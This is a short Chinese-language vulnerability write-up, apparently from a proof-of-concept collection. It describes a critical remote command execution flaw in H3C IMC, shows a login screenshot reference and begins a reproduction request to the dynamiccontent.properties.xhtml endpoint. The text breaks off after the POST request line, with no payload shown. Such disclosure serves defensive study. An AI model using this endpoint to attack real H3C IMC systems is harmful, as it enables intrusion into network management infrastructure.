# H3C IMC dynamiccontent.properties.xhtm 远程命令执行

## 漏洞描述
H3C IMC dynamiccontent.properties.xhtm 存在远程命令执行，攻击者通过构造特殊的请求造成远程命令执行

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面

![](images/202202091825625.png)



发送如下请求包

```plain
POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
